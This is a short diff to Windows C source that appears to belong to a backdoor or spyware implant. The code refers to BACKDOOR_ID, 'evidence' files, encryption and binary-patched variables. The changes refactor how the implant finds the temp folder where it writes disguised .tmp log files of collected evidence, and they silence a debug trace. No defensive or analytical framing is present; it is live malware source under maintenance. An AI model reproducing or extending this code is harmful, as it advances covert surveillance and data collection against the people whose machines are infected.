@@ -1,5 +1,6 @@
 #include <Windows.h>
 
+#include "main.h"
 #include "log_files.h"
 #include "binpatched_vars.h"
 #include "crypt.h"
@@ -23,8 +24,7 @@ VOID ProcessEvidenceFiles()
 	WIN32_FIND_DATA pFindData;
 	PBYTE pCryptedBuffer;
 
-	pTempPath = (LPWSTR)malloc(32767 * sizeof(WCHAR));
-	GetEnvironmentVariable(L"TMP", pTempPath, 32767 * sizeof(WCHAR));
+	pTempPath = GetTemp();
 
 	pFindArgument = (LPWSTR)malloc(32767 * sizeof(WCHAR));
 	PBYTE pPrefix = (PBYTE)BACKDOOR_ID + 4;
@@ -126,8 +126,8 @@ HANDLE CreateLogFile(ULONG uEvidenceType, PBYTE pAdditionalHeader, ULONG uAdditi
 
 #ifdef _DEBUG
 	LPWSTR pDebugString = (LPWSTR)malloc(4096);
-	wsprintf(pDebugString, L"[+] CreateLogFile, uEvidenceType: %08x, pAdditionalHeader: %08x, uAdditionalLen: %08x\n", uEvidenceType, pAdditionalHeader, uAdditionalLen);
-	OutputDebugString(pDebugString);
+//	wsprintf(pDebugString, L"[+] CreateLogFile, uEvidenceType: %08x, pAdditionalHeader: %08x, uAdditionalLen: %08x\n", uEvidenceType, pAdditionalHeader, uAdditionalLen);
+//	OutputDebugString(pDebugString);
 	free(pDebugString);
 #endif
 
@@ -137,13 +137,12 @@ HANDLE CreateLogFile(ULONG uEvidenceType, PBYTE pAdditionalHeader, ULONG uAdditi
 		GetSystemTimeAsFileTime(&uFileTime);
 
 		pFileName = (LPWSTR)malloc(32767 * sizeof(WCHAR));
-		pTempPath = (LPWSTR)malloc(32767 * sizeof(WCHAR));
 		pFileSuffix = pTempFileSuffix = (LPWSTR)malloc(32767 * sizeof(WCHAR));
 		wsprintf(pFileSuffix, L"%S", BACKDOOR_ID + 4);
 		while(*pTempFileSuffix == L'0')
 			pTempFileSuffix++;
 
-		GetEnvironmentVariable(L"TMP", pTempPath, 32767 * sizeof(WCHAR));
+		pTempPath = GetTemp();
 		do
 		{
 			wsprintf(pFileName, L"%s\\%s%x%x.tmp", pTempPath, pTempFileSuffix, uFileTime.dwHighDateTime, uFileTime.dwLowDateTime);
